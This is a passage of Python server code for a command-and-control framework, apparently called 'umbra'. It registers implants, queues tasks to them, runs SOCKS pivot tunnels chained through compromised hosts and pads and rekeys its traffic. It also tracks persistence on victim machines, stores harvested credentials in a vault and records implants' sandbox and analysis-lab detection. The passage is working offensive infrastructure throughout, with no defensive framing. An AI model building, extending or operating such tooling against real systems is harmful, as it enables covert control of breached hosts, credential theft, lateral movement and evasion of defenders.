                        conn.sendall(_socks5_reply(0x01, listen_host))
                    except OSError:
                        pass
                return
            with self._lock:
                info = self.pivots.get(tunnel_id)
                if info is not None:
                    info["streams"] = info.get("streams", 0) + 1
                    info["last_active"] = _now()

            if mode == "socks":
                # The target is reachable: the client may talk to it.
                try:
                    conn.sendall(_socks5_reply(0x00, listen_host))
                except OSError:
                    return

            # The local side closed: the stream is over even when the
            # agent is slow to say so.
            local_closed = threading.Event()

            def pump_in() -> None:
                try:
                    while True:
                        data = conn.recv(32768)
                        if not data:
                            break
                        counter["up"] += len(data)
                        opener.send(
                            wire.MsgType.TUNNEL_DATA, {"stream": st.id, "data": data}
                        )
                except OSError:
                    pass
                finally:
                    local_closed.set()
                    try:
                        opener.send(
                            wire.MsgType.TUNNEL_CLOSE,
                            {"stream": st.id, "reason": "the local side closed"},
                        )
                    except Exception:
                        pass

            t = threading.Thread(target=pump_in, daemon=True)
            t.start()
            while True:
                if st.closed.is_set() or local_closed.is_set():
                    break
                try:
                    chunk = st.data.get(timeout=0.5)
                except queue.Empty:
                    continue
                if not chunk:
                    break
                counter["down"] += len(chunk)
                conn.sendall(chunk)
            state = "closed"
        except Exception as exc:
            state = "refused"
            self.emit("pivot.error", agent_id, data={"tunnel": tunnel_id, "err": str(exc)})
        finally:
            # The connection is booked whatever happened: a client that
            # vanished is still a client of the proxy.
            self._pivot_note(client, target_host, target_port,
                             counter["up"], counter["down"], state)
            try:
                conn.close()
            except OSError:
                pass

    def _peer_addr(self, agent_id: str) -> Tuple[str, int]:
        """The peer address of an agent: where its peer listener waits.

        The beacon reports it in the handshake, so the server can chain a
        pivot through it without the operator naming an address.
        """
        with self._lock:
            record = self.agents.get(agent_id) or {}
        addr = str(record.get("p2p", "") or "")
        if not addr:
            raise RuntimeError(f"agent {agent_id} has no peer address")
        host, _, port = addr.rpartition(":")
        if not host or not port.isdigit():
            raise RuntimeError(f"agent {agent_id} has a bad peer address {addr!r}")
        return host, int(port)

    def _pivot_open_chain(
        self, agent_id: str, path: List[str], host: str, port: int
    ) -> Tuple[Any, TunnelStream]:
        """Open a stream to the target, walking the path of the pivot.

        The first hop is the agent the pivot belongs to.  Every further hop
        is reached through the peer link: the server asks the previous agent
        for a stream to the next one and then plays the peer on that
        stream.  The operator only names the far end; the path is resolved
        here, from the addresses the beacons reported.
        """
        opener: Any = self._tunnel_session(agent_id)
        for hop in path:
            peer_host, peer_port = self._peer_addr(hop)
            st = opener.open_stream(peer_host, peer_port)
            try:
                sess = peer.dial_peer(st, self.agent_psk, "umbra-server")
            except Exception:
                # The peer link is down: the server takes the hop over.
                # The pivot still works, only the traffic takes another
                # road.
                opener = self._tunnel_session(hop)
                continue
            link = peer.PeerLink(sess, st, ident=hop)
            link.start()
            opener = link
        return opener, opener.open_stream(host, port)

    def _pivot_topology(self) -> Dict[str, Any]:
        """The picture of the reach.

        The same shape the Go server sends: the agents, the pivots between
        them, the clients of the proxy and the log of the connections.
        """
        with self._lock:
            agents = [dict(a) for a in self.agents.values()]
            edges = []
            per_agent: Dict[str, int] = {}
            for info in self.pivots.values():
                per_agent[info.get("agent_id", "")] = per_agent.get(info.get("agent_id", ""), 0) + 1
                edges.append({
                    "tunnel": info.get("stream", ""),
                    "agent_id": info.get("agent_id", ""),
                    "through": info.get("through", ""),
                    "mode": info.get("mode", ""),
                    "listen": info.get("listen", ""),
                    "host": info.get("host", ""),
                    "port": info.get("port", 0),
                    "streams": info.get("streams", 0),
                    "bytes_up": info.get("bytes_up", 0),
                    "bytes_down": info.get("bytes_down", 0),
                    "last_active": info.get("last_active", 0),
                    "state": info.get("state", ""),
                    "claim": info.get("claim", ""),
                    "dns": info.get("dns", ""),
                    "path": list(info.get("path", []) or []),
                })
            nodes = []
            for agent in agents:
                count = per_agent.get(agent.get("id", ""), 0)
                nodes.append({
                    "agent_id": agent.get("id", ""),
                    "role": "pivot" if count else "host",
                    "transport": agent.get("transport", ""),
                    "online": agent.get("state", "") == "online",
                    "tunnels": count,
                })
            clients = [dict(c) for c in self.pivot_clients.values()]
            connections = [dict(c) for c in self.pivot_connections]
            claims = {name: list(ids) for name, ids in self.pivot_claims.items()}
            sessions = len(self.tunnel_sessions)
        return {
            "nodes": nodes,
            "edges": edges,
            "clients": clients,
            "connections": connections,
            "claims": claims,
            "sessions": sessions,
            "tunnels": len(edges),
        }

    def _pivot_note(self, client: str, target: str, port: int,
                    up: int, down: int, state: str) -> None:
        """Book one connection of the proxy.

        The log keeps the last 256 connections and the accounting keeps
        what every client of the proxy has done.
        """
        now = _now()
        with self._lock:
            self.pivot_connections.append({
                "client": client,
                "target": target,
                "port": port,
                "bytes_up": up,
                "bytes_down": down,
                "at": now,
                "state": state,
            })
            if len(self.pivot_connections) > 256:
                self.pivot_connections = self.pivot_connections[-256:]
            entry = self.pivot_clients.get(client)
            if entry is None:
                entry = {"address": client, "connections": 0, "bytes_up": 0,
                         "bytes_down": 0, "first": now, "last": now}
                self.pivot_clients[client] = entry
            entry["connections"] += 1
            entry["bytes_up"] += up
            entry["bytes_down"] += down
            entry["last"] = now

    # -- agents ----------------------------------------------------------
    def _schedule_loop(self) -> None:
        while not self._stop.is_set():
            try:
                self._due_schedules()
            except Exception:  # pragma: no cover - dev helper
                pass
            self._stop.wait(0.1)

    def _register_agent(self, agent_id: str, meta: Dict[str, Any], addr: str,
                        caps: Optional[List[str]] = None, version: int = 1,
                        implant_version: str = "", abi: int = 0) -> None:
        """Put an agent into the inventory.

        The socket transports and the batch transports register the same
        way, so the inventory does not know which road an agent took.
        """
        with self._lock:
            is_new = agent_id not in self.agents
            record = self.agents.setdefault(agent_id, {})
            record.update(
                {
                    "id": agent_id,
                    "host": meta.get("host", "?"),
                    "os": meta.get("os", "?"),
                    "arch": meta.get("arch", "?"),
                    "user": meta.get("user", "?"),
                    "pid": meta.get("pid", 0),
                    "version": meta.get("ver", "?"),
                    "transport": str(meta.get("transport", "") or "tcp"),
                    "addr": addr,
                    "state": "online",
                    # The capability list is what the beacon said it can
                    # do; the panic flag belongs to the operator, so it
                    # survives a re-registration.
                    "caps": list(caps or meta.get("caps") or record.get("caps") or []),
                    # The handshake the beacon speaks, the version of the
                    # implant itself and the module ABI it understands.
                    "hello_version": int(version),
                    "implant_version": str(implant_version or record.get("implant_version") or ""),
                    "abi": int(abi or record.get("abi") or 0),
                    # The peer address of the beacon: where another
                    # beacon (or the server) can dial in to carry a
                    # pivot through this host.
                    "p2p": str(meta.get("p2p", "") or record.get("p2p", "") or ""),
                    "panicked": bool(record.get("panicked", False)),
                    # The cadence the operator configured survives a
                    # re-registration: the beacon reconnects every cycle.
                    "sleep": record.get("sleep", self.sleep),
                    "jitter": record.get("jitter", self.jitter),
                    "last_seen": _now(),
                    "first_seen": record.get("first_seen", _now()),
                }
            )
        self.emit("agent.new" if is_new else "agent.online", agent_id, data={"host": record["host"], "os": record["os"]})

    def _agent_loop(self, stream: netio.Stream, result: handshake.HandshakeResult, addr: str) -> None:
        sess = result.session
        agent_id = result.peer_id
        self._register_agent(agent_id, result.meta, addr, caps=list(result.caps),
                              version=result.version,
                              implant_version=result.implant_version, abi=result.abi)
        try:
            while not self._stop.is_set():
                raw = stream.recv_frame()
                msg_type, msg = sess.decrypt_message(raw)
                if not self._agent_frame(stream, sess, agent_id, msg_type, msg):
                    break
        except (netio.StreamError, session.SessionError, OSError, ValueError):
            pass
        finally:
            # The beacon closes its connection after every cycle, so a closed
            # link does not mean a dead agent: it is offline once it has been
            # quiet for longer than the grace period.
            went_offline = False
            with self._lock:
                record = self.agents.get(agent_id)
                if record is not None:
                    record["last_seen"] = _now()
                    if _now() - int(record.get("last_seen", 0)) > OFFLINE_GRACE:
                        record["state"] = "offline"
                        went_offline = True
            if went_offline:
                self.emit("agent.offline", agent_id)
            stream.close()

    def _agent_frame(self, stream: Any, sess: Any, agent_id: str,
                     msg_type: int, msg: Dict[str, Any]) -> bool:
        """Handle one frame of an agent.  False ends the session.

        The loop of the socket transport and the batch of the mail and the
        object transport share this, so an agent behaves the same way on
        every transport.
        """
        if msg_type == wire.MsgType.HEARTBEAT:
            # The cheap signal of a beacon that is alive but between two
            # check-ins: the version of the implant, the module ABI it
            # speaks and how much work it is carrying.
            self._heartbeat(agent_id, msg)
            return True
        if msg_type == wire.MsgType.CHECKIN:
            # The implant says who it is running as: the inventory
            # has to show the truth, not the account it started with.
            identity = ""
            if isinstance(msg.get("impersonation"), str):
                identity = str(msg.get("impersonation") or "")
            with self._lock:
                record = self.agents.get(agent_id)
                if record is not None:
                    record["last_seen"] = _now()
                    record["state"] = "online"
                    record["impersonation"] = identity
            batch = self._take_tasks(agent_id)
            # The cadence the server pushes is the one the operator
            # configured for this agent.
            with self._lock:
                record = self.agents.get(agent_id) or {}
                sleep = int(record.get("sleep", self.sleep))
                jitter = int(record.get("jitter", self.jitter))
                obfuscate = bool(record.get("obfuscate", True))
                route = self.routes.get(agent_id)
            body = {
                "tasks": batch,
                "sleep": sleep,
                "jitter": jitter,
                "obf": obfuscate,
                "server_time": _now(),
            }
            # The route of the agent travels with the batch: the
            # beacon learns which transport it speaks and in which
            # order it may fall back.
            if route:
                body["route"] = {
                    "primary": route.get("primary", ""),
                    "fallback": list(route.get("fallback") or []),
                    "front": route.get("front", ""),
                    "inspect": bool(route.get("inspect", False)),
                    "http_path": route.get("http_path", ""),
                    "ws_path": route.get("ws_path", ""),
                }
            # Rotation order is part of the protocol: the REKEY frame is
            # sealed with the OLD key set, written first, and only then
            # does the server switch. The peer sees REKEY at the old
            # counter, applies it, resets to 0 and opens TASK_BATCH with
            # the new key set as its first frame.
            if self.rekey_after and sess.needs_rekey(self.rekey_after):
                seed = crypto.random_bytes(32)
                stream.send_frame(sess.encrypt(wire.MsgType.REKEY, {"seed": seed}))
                sess.apply_rekey(seed)
            # Cancels sit between REKEY and TASK_BATCH: they are sealed
            # with whatever keys are current, and must arrive before the
            # batch whose tasks they refer to.
            with self._lock:
                cancels = self.pending_cancels.pop(agent_id, [])
            for task_id in cancels:
                stream.send_frame(sess.encrypt(wire.MsgType.TASK_CANCEL, {"id": task_id}))
            stream.send_frame(sess.encrypt(wire.MsgType.TASK_BATCH, body))
        elif msg_type == wire.MsgType.RESULT:
            self._complete_task(msg)
        elif msg_type == wire.MsgType.BYE:
            return False
        elif msg_type == wire.MsgType.PING:
            stream.send_frame(sess.encrypt(wire.MsgType.PONG, {"ts": msg.get("ts", 0)}))
        elif msg_type == wire.MsgType.REKEY:
            seed = msg.get("seed", b"")
            if isinstance(seed, (bytes, bytearray)) and len(seed) == 32:
                sess.apply_rekey(bytes(seed))
        elif msg_type == wire.MsgType.PADDING:
            # Padding frames carry random bytes and are ignored.
            pass
        else:
            return False
        return True

    PERSIST_KINDS = (
        "persist", "unpersist", "persist.list", "persist.verify",
        "persist.migrate", "persist.health",
        # The exit takes the entries with it.
        "exit", "kill",
    )

    def _persistence_result(self, task: Dict[str, Any], task_id: str) -> None:
        """Keep the persistence record of an agent, from what it reported.

        The beacon is the only side that knows what is really on the
        machine, so its report is the record.  A task that failed keeps the
        old record: a failed verification must not wipe the truth.
        """
        if str(task.get("kind", "")) not in self.PERSIST_KINDS:
            return
        meta = task.get("meta") or {}
        entries = meta.get("persist")
        if not isinstance(entries, list):
            return
        agent_id = str(task.get("agent_id", ""))
        with self._lock:
            record = self.agents.get(agent_id)
            if record is None:
                return
            record["persist"] = [dict(entry) for entry in entries]
        broken = len([e for e in entries if isinstance(e, dict) and e.get("state") == "broken"])
        methods = sorted({str(e.get("technique", "")) for e in entries if isinstance(e, dict)})
        self.emit("persist.updated", agent_id, task_id=task_id,
                  data={"entries": len(entries), "broken": broken, "methods": methods})
        if broken:
            self.emit("persist.broken", agent_id, task_id=task_id,
                      data={"broken": broken, "total": len(entries)})

    def _redact_credentials(self, meta: Dict[str, Any]) -> Optional[List[Dict[str, Any]]]:
        """Take the value out of the material of a result.

        The task record and the event stream keep the shape of the
        material and lose the value: the vault is the place for the value,
        and the vault is the place the operator asked for it.  The entries
        that carried a value are returned, so they can go into the vault.
        """
        entries = meta.get("creds")
        if not isinstance(entries, list):
            return None
        collected: List[Dict[str, Any]] = []
        redacted: List[Dict[str, Any]] = []
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            copy = dict(entry)
            secret = str(copy.get("secret", "") or "")
            if secret:
                # A copy of its own: the record that goes into the vault
                # keeps the value, the record that stays in the task does
                # not.
                collected.append(dict(entry))
            copy["secret"] = ""
            copy["redacted"] = True
            redacted.append(copy)
        meta["creds"] = redacted
        return collected

    def _creds_result(self, task: Dict[str, Any], task_id: str,
                      entries: List[Dict[str, Any]]) -> None:
        """Keep the material of an agent in the vault.

        The value never reaches the event stream: the vault is the place
        for it, and the console asks for it there.
        """
        if str(task.get("kind", "")) != "creds":
            return
        agent_id = str(task.get("agent_id", ""))
        collected = 0
        with self._lock:
            for entry in entries:
                if not isinstance(entry, dict):
                    continue
                secret = str(entry.get("secret", "") or "")
                if not secret:
                    continue
                record = {
                    "id": f"cred-{len(self.credentials) + 1}",
                    "agent_id": agent_id,
                    "source": str(entry.get("source", "")),
                    "account": str(entry.get("account", "")),
                    "target": str(entry.get("target", "")),
                    "kind": str(entry.get("kind", "")),
                    "secret": secret,
                    "digest": hashlib.sha256(secret.encode()).hexdigest(),
                    "confidence": int(entry.get("confidence", 0) or 0),
                    "note": str(entry.get("note", "")),
                    "collected": _now(),
                }
                self.credentials.append(record)
                collected += 1
        # The event carries the shape of the material and never the value.
        self.emit("creds.collected", agent_id, task_id=task_id,
                  data={"collected": collected, "dropped": 0})

    EVADE_KINDS = (
        "evade.report", "evade.posture", "evade.profile", "evade.shape",
        "evade.killswitch", "hygiene.memory", "hygiene.process",
        "host.guide",
    )

    def _posture_result(self, task: Dict[str, Any], task_id: str) -> None:
        """Keep the posture of an agent, from what it reported.

        The beacon is the only side that knows what the host looks like, so
        its report is the record.  A task that says nothing about the
        posture leaves the record alone.
        """
        if str(task.get("kind", "")) not in self.EVADE_KINDS:
            return
        meta = task.get("meta") or {}
        posture = meta.get("posture")
        if not isinstance(posture, dict):
            return
        agent_id = str(task.get("agent_id", ""))
        with self._lock:
            record = self.agents.get(agent_id)
            if record is None:
                return
            record["posture"] = dict(posture)
        self.emit("posture.updated", agent_id, task_id=task_id, data={
            "label": posture.get("label", ""),
            "virtual": bool(posture.get("virtual")),
            "lab": bool(posture.get("lab")),
            "sandbox": bool(posture.get("sandbox")),
            "confidence": int(posture.get("confidence", 0) or 0),
            "silent": bool(meta.get("posture_silent")),
        })
        switch = meta.get("killswitch")
        if isinstance(switch, dict) and switch.get("armed"):
            self.emit("killswitch.armed", agent_id, task_id=task_id, data={"armed": True})

    def _heartbeat(self, agent_id: str, msg: Dict[str, Any]) -> None:
        """Record a heartbeat of a beacon."""
        busy = 0
        try:
            busy = int(msg.get("busy", 0) or 0)
        except (TypeError, ValueError):
            busy = 0
        with self._lock:
            record = self.agents.get(agent_id)
            if record is None:
                return
            record["heartbeat"] = _now()
            record["busy"] = busy
            record["implant_version"] = str(msg.get("iver", "") or "")
            record["abi"] = int(msg.get("abi", 0) or 0)
            record["uptime"] = int(msg.get("up", 0) or 0)
        self.emit("agent.heartbeat", agent_id, data={
            "busy": busy,
            "implant_version": str(msg.get("iver", "") or ""),
            "abi": int(msg.get("abi", 0) or 0),
        })

    def _take_tasks(self, agent_id: str) -> List[Dict[str, Any]]:
        """The tasks of one agent, in the order they should be delivered.

        The queue is ordered by priority first and by age second: the work
        the operator marked as important goes first, and the rest keeps its
        order, so nothing starves behind a flood of low priority work.
        """
        out: List[Dict[str, Any]] = []
        with self._lock:
            if self.quiet:
                # The maintenance window: the beacon checks in and gets
                # nothing.
                return out
            if self.breakers.get(agent_id, 0) >= BREAKER_THRESHOLD:
                return out
            candidates = [t for t in self.tasks.values()
                          if t["agent_id"] == agent_id and t["state"] == "queued"]
            candidates.sort(key=lambda t: (-int(t.get("priority", 0) or 0),
                                            t.get("created", 0)))
            for task in candidates:
                if len(out) >= 32:
                    break
                task["state"] = "delivered"
                task["delivered"] = _now()
                task["attempts"] = int(task.get("attempts", 0) or 0) + 1
                out.append({"id": task["id"], "kind": task["kind"], "args": task["args"]})
        if out:
            # What was handed out, in which order: the operator can see
            # that the urgent task really went first.
            self.delivery_log.append([t["id"] for t in out])
        for t in out:
            self.emit("task.delivered", agent_id, task_id=t["id"])
        return out

    def sweep_tasks(self, timeout_s: int) -> List[str]:
        """Fail the tasks that were delivered but never completed.

        Mirrors the Go server's sweep: a beacon that dies in the middle of
        a task leaves it in the "delivered" state, and the operator has to
        learn that instead of waiting forever.

        A task with a deadline of its own is cancelled when the deadline
        passes, and a task with a timeout of its own is measured by that
        timeout: the promise the operator made is kept by the server.
        """
        expired: List[str] = []
        with self._lock:
            now = _now()
            for task in self.tasks.values():
                if task["state"] != "queued":
                    continue
                deadline = int(task.get("deadline", 0) or 0)
                if deadline <= 0 or deadline > now:
                    continue
                task["state"] = "cancelled"
                task["err"] = "the deadline passed"
                task["completed"] = now
                expired.append(task["id"])
        for task_id in expired:
            self.emit("task.expired", task_id=task_id, data={})
        if timeout_s <= 0:
            return expired
        now = _now()
        cutoff = now - timeout_s
        failed: List[str] = []
        with self._lock:
            for task in self.tasks.values():
                if task["state"] != "delivered":
                    continue
                delivered = int(task.get("delivered", 0))
                if delivered == 0:
                    continue
                # A task with a timeout of its own is measured by it.
                limit = int(task.get("timeout", 0) or 0) or timeout_s
                if delivered > now - limit:
                    continue
                task["state"] = "failed"
                task["err"] = "the agent never answered"
                task["completed"] = _now()
                # A task that keeps failing ends up in the dead letter
                # queue: it is not run again without a decision.
                if int(task.get("attempts", 0) or 0) >= MAX_ATTEMPTS:
                    task["state"] = "dead"
                    self.breakers[task["agent_id"]] = self.breakers.get(
                        task["agent_id"], 0) + 1
                failed.append(task["id"])
        for task_id in failed:
            self.emit("task.timeout", task_id=task_id, data={})
        return expired + failed

    def _refusal(self, agent_id: str, kind: str) -> str:
        """The reason a task must not be queued, or an empty string.

        The checks live in one place, because every kind of task goes
        through the same door: a burned agent refuses work, and an agent
        that advertised its capabilities is never asked for anything else.
        An agent that advertised nothing (an older beacon) may be asked for
        everything, exactly as the Go server does.
        """
        with self._lock:
            record = self.agents.get(agent_id)
            if record is None:
                return f"unknown agent {agent_id!r}"
            if record.get("panicked"):
                return f"agent {agent_id} was panicked and accepts no further work"
            caps = list(record.get("caps") or [])
        if caps and kind not in caps:
            return f"agent {agent_id} does not support the task kind {kind!r}"
        return ""

    def _queue_task(self, agent_id: str, kind: str,
                    task_args: Dict[str, Any],
                    deadline: int = 0, timeout: int = 0) -> Dict[str, Any]:
        """Queue a task and announce it.

        The trace id follows the task from this call to the result, so the
        operator can grep for it.  The deadline is the moment after which
        the task is not worth running, and the timeout is how long it may
        run: the beacon is told the bound so it can stop the work itself.
        """
        task_args = dict(task_args or {})
        if timeout and "timeout" not in task_args:
            task_args["timeout"] = int(timeout)
        task = {
            "id": new_id("t"),
            "agent_id": agent_id,
            "kind": kind,
            "args": task_args,
            "state": "queued",
            "code": 0,
            "out": b"",
            "err": "",
            "created": _now(),
            "trace_id": secrets.token_hex(8),
            "attempts": 0,
            "priority": 0,
            "deadline": int(deadline or 0),
            "timeout": int(timeout or 0),
        }
        with self._lock:
            self.tasks[task["id"]] = task
        self.emit("task.queued", agent_id, task_id=task["id"], data={"kind": kind})
        return task

    def _wait_task(self, task_id: str, timeout: float = 30.0) -> Dict[str, Any]:
        """Wait for a task to finish, the way the console does."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return {"state": "failed", "code": 0, "out": b"", "err": "gone"}
                if task.get("state") in ("done", "failed", "cancelled"):
                    return dict(task)
            time.sleep(0.05)
        with self._lock:
            task = self.tasks.get(task_id) or {}
        return dict(task)

    def _run_workflow(self, run_id: str, workflow: Dict[str, Any],
                      params: Dict[str, str]) -> None:
        """Walk the steps of a workflow, the way the Go hub does.

        The run happens in the background: the implant answers when it
        checks in again, and the console does not wait for it.
        """
        steps = _expand_workflow_steps(workflow.get("steps") or [], params)
        report: List[str] = []
        collected: List[str] = []
        last_ok = True
        last_code = 0
        with self._lock:
            run = self.workflow_runs.get(run_id)
            if run is None:
                return
            run["state"] = "running"
        for index, step in enumerate(steps):
            entry: Dict[str, Any] = {"index": index, "kind": str(step.get("kind", "")),
                                     "ok": True, "code": 0}
            kind = step.get("kind")
            if kind == "wait":
                seconds = int(step.get("seconds", 0) or 0)
                entry["detail"] = f"{seconds} seconds"
                if seconds > 0:
                    time.sleep(min(seconds, 5))
            elif kind == "condition":
                condition = str(step.get("condition", ""))
                entry["detail"] = condition
                if condition == "failed":
                    last_ok = not last_ok
                elif condition.startswith("code=="):
                    last_ok = condition[len("code=="):].strip() == str(last_code)
                entry["ok"] = last_ok
                if not last_ok:
                    entry["skipped"] = True
                    entry["detail"] = condition + " was not met"
            elif kind == "report":
                entry["detail"] = str(step.get("title", "report"))
                report.append("## " + entry["detail"] + "\n")
                report.append("\n".join(collected) or "_nothing yet_")
                report.append("")
            else:
                agent = str(step.get("agent", ""))
                task_kind = str(step.get("task_kind", ""))
                problem = self._refusal(agent, task_kind) if task_kind else "no task kind"
                if problem:
                    entry["ok"] = False
                    entry["detail"] = problem
                else:
                    task = self._queue_task(agent, task_kind, step.get("args") or {})
                    entry["task_id"] = task["id"]
                    result = self._wait_task(task["id"])
                    entry["state"] = result.get("state", "done")
                    entry["code"] = int(result.get("code", 0) or 0)
                    out = result.get("out", b"")
                    text = out.decode("utf-8", "replace") if isinstance(out, bytes) else str(out)
                    entry["output"] = text
                    entry["ok"] = entry["state"] == "done" and entry["code"] == 0
                    collected.append(text)
                last_ok = bool(entry["ok"])
                last_code = int(entry["code"])
            with self._lock:
                run = self.workflow_runs.get(run_id)
                if run is not None:
                    run["steps"].append(entry)
                    run["current"] = index + 1
                    if entry.get("skipped"):
                        run["state"] = "stopped"
                        run["finished"] = _now()
            self.emit("workflow.step", data={"workflow": workflow.get("name", ""),
                                             "run": run_id, "step": index,
                                             "kind": kind, "ok": entry.get("ok")})
            if entry.get("skipped"):
                break
        with self._lock:
            run = self.workflow_runs.get(run_id)
            if run is not None:
                if run.get("state") != "stopped":
                    run["state"] = "done"
                run["finished"] = _now()
                run["report"] = "\n".join(report)
        self.emit("workflow.finished", data={"workflow": workflow.get("name", ""),
                                             "run": run_id, "state": "done"})

    def _advance_chain(self, task_id: str, output: bytes) -> None:
        """Hand the output of a finished stage to the next one."""
        with self._lock:
            task = self.tasks.get(task_id)
            if task is None:
                return
            chain_id = task.get("chain_id")
            if not chain_id:
                return
            chain = self.chains.get(chain_id)
            if chain is None:
                return
            chain["stage"] += 1
            stage = chain["stage"]
            stages = chain["stages"]
            agent_id = chain["agent_id"]
            if stage >= len(stages):
                self.chains.pop(chain_id, None)
                finished = True
                next_task = None
                next_kind = ""
            else:
                finished = False
                nxt = stages[stage]
                args = _substitute_output(nxt.get("args") or {}, output)
                next_kind = str(nxt.get("kind", ""))
                next_task = None
        if not finished and next_task is None:
            # The lock is released before the task is queued: the queue
            # helper takes it itself.
            next_task = self._queue_task(agent_id, next_kind, args)
            with self._lock:
                next_task["chain_id"] = chain_id
                next_task["stage"] = stage
        if finished:
            self.emit("chain.done", task.get("agent_id", ""), task_id=task_id,
                      data={"chain": chain_id, "stages": stage})
        elif next_task is not None:
            self.emit("chain.stage", next_task["agent_id"], task_id=next_task["id"],
                      data={"chain": chain_id, "stage": stage,
                            "kind": next_task["kind"]})

    def _complete_task(self, msg: Dict[str, Any]) -> None:
        task_id = str(msg.get("id", ""))
        out = msg.get("out", b"")
        if isinstance(out, (bytes, bytearray)):
            out = bytes(out)
        if bool(msg.get("partial", False)):
            # A streamed chunk: the task is still running, so the chunk is
            # appended and the consoles are told about it.
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return
                previous = task.get("out", b"")
                if not isinstance(previous, (bytes, bytearray)):
                    previous = str(previous).encode()
                task["out"] = bytes(previous) + out
                meta = {
                    k: v
                    for k, v in msg.items()
                    if k not in ("id", "code", "out", "err", "partial")
                    and isinstance(v, (str, bool, int, float))
                }
                if meta:
                    task["meta"] = meta
                size = len(task["out"])
                # A streamed chunk may carry the id of the session it
                # belongs to: the server keeps the list of open sessions.
                session_id = str(meta.get("session", "") or "")
                if session_id:
                    agent_id = str(task.get("agent_id", ""))
                    entry = self.open_sessions.get(session_id)
                    if entry is None:
                        entry = {"id": session_id, "agent_id": agent_id,
                                 "task_id": task_id, "opened": _now(),
                                 "last": _now(), "bytes": 0}
                        self.open_sessions[session_id] = entry
                    entry["last"] = _now()
                    entry["bytes"] = int(entry["bytes"]) + len(out)
            data: Dict[str, Any] = {"size": size}
            if meta:
                data["meta"] = meta
            if out:
                try:
                    data["output"] = out.decode()
                except UnicodeDecodeError:
                    data["binary"] = True
            self.emit("task.output", task_id=task_id, data=data)
            return
        with self._lock:
            task = self.tasks.get(task_id)
            if task is None:
                return
            if task["state"] != "cancelled":
                task["state"] = "done" if int(msg.get("code", 0)) == 0 else "failed"
            task["code"] = int(msg.get("code", 0))
            task["out"] = out
            # A finished "session.close" means the session is gone.
            if str(task.get("kind", "")) == "session.close":
                session_id = str((task.get("args") or {}).get("session", "") or "")
                if session_id:
                    self.open_sessions.pop(session_id, None)
            task["err"] = str(msg.get("err", ""))
            # The breaker of the host: a host that answers clears its
            # failures, a host that fails counts them, and a host that
            # fails too often in a row has its work parked.
            agent_id = str(task.get("agent_id", "") or "")
            if task["state"] == "failed":
                self.breakers[agent_id] = self.breakers.get(agent_id, 0) + 1
                if self.breakers[agent_id] >= BREAKER_THRESHOLD:
                    task["state"] = "dead"
                    task["err"] = task["err"] or "the host was not answering"
            elif agent_id:
                self.breakers[agent_id] = 0
            meta = {
                k: v
                for k, v in msg.items()
                if k not in ("id", "code", "out", "err")
                and isinstance(v, (str, bool, int, float, list, dict))
            }
            if meta:
                task["meta"] = meta
            # The value of a credential never reaches the task record or
            # the event stream: it goes to the vault.
            creds = self._redact_credentials(meta)
            task["completed"] = _now()
            snapshot = dict(task)
        raw = snapshot["out"]
        if not isinstance(raw, (bytes, bytearray)):
            raw = str(raw).encode()
        raw = bytes(raw)
        data = {
            "code": snapshot["code"],
            "state": snapshot["state"],
            "err": snapshot["err"],
            # Bounded preview, exactly like the Go server: a binary chunk is not
            # pushed to every watching console, and task.get has the real bytes.
            "size": len(raw),
        }
        if raw:
            preview = raw[:EVENT_OUTPUT_MAX]
            try:
                data["output"] = preview.decode("utf-8")
            except UnicodeDecodeError:
                data["binary"] = True
            if len(raw) > EVENT_OUTPUT_MAX:
                data["truncated"] = True
        if snapshot.get("meta"):
            data["meta"] = snapshot["meta"]
        self.emit("task.result", snapshot["agent_id"], task_id=task_id, data=data)
        # A persistence task reports what is installed on the host: the
        # server keeps the record, so the operator sees the coverage of the
        # fleet and hears about an entry that was removed behind their back.
        self._persistence_result(snapshot, task_id)
        # An evasion task reports how the implant sees the host: the server
        # keeps the last posture, so the operator does not have to run a
        # task to know what a machine is.
        self._posture_result(snapshot, task_id)
        # A credential task hands its material to the vault.
        if creds is not None:
            self._creds_result(snapshot, task_id, creds)
        # A stage of a multi-stage task hands its output to the next stage.
        self._advance_chain(task_id, raw)

    # -- operators -------------------------------------------------------
    def _operator_loop(
        self,
        stream: netio.Stream,
        result: handshake.HandshakeResult,
        addr: str,
        inbox: Optional["queue.Queue[Dict[str, Any]]"] = None,
    ) -> None:
        sess = result.session
        if inbox is None:
            # A caller that did not subscribe the peer first (the tests that
            # drive the loop directly) still gets a working subscription.
            inbox = queue.Queue(maxsize=512)
            with self._lock:
                self.subscribers.append((result.peer_id, inbox))
                self.op_sessions[result.peer_id] = {
                    "name": result.peer_id,
                    "role": self.roles.get(result.peer_id, "operator"),
                    "peer": addr,
                    "transport": "tcp/operator",
                    "since": _now(),
                    "focus": "",
                    "focus_at": "",
                    "last_seen": time.time(),
                }
            self.emit("operator.connected", result.peer_id)

        # Both the event pusher and the request handler write to this
        # connection, so they must share one gate: see netio.SendGate.
        gate = netio.SendGate(sess, stream)

        def writer() -> None:
            while not self._stop.is_set():
                try:
                    ev = inbox.get(timeout=0.2)
                except queue.Empty:
                    continue
                try:
                    gate.send(wire.MsgType.OP_EVENT, ev)
                except (OSError, netio.StreamError, session.SessionError):
                    return

        wt = threading.Thread(target=writer, daemon=True)
        wt.start()
        try:
            while not self._stop.is_set():
                raw = stream.recv_frame()
                msg_type, req = sess.decrypt_message(raw)
                if msg_type == wire.MsgType.PADDING:
                    # Padding frames carry random bytes and are ignored.
                    continue
                if msg_type != wire.MsgType.OP_REQUEST:
                    break
                with self._lock:
                    # NB: `session` is the module; do not shadow it here.
                    presence = self.op_sessions.get(result.peer_id)
                    if presence is not None:
                        presence["last_seen"] = time.time()
                resp = self.dispatch(req, operator=result.peer_id, peer=addr)
                gate.send(wire.MsgType.OP_RESPONSE, resp)
        except (netio.StreamError, session.SessionError, OSError, ValueError):
            pass
        finally:
            with self._lock:
                self.subscribers = [(n, q) for (n, q) in self.subscribers if q is not inbox]
                self.op_sessions.pop(result.peer_id, None)
            stream.close()

    # Mirrors server/internal/rbac/resources.go: minimum role per command.
    ROLE_RANK = {"viewer": 1, "operator": 2, "admin": 3}
    REQUIREMENTS = {
        "ping": "viewer",
        "whoami": "viewer",
        "server.stats": "viewer",
        "audit.tail": "viewer",
        "operators.list": "viewer",
        "agents.list": "viewer",
        "agents.info": "viewer",
        "task.get": "viewer",
        "task.list": "viewer",
        "chat.history": "viewer",
        # Who is in the channel is presence, like the operator list.
        "chat.operators": "viewer",
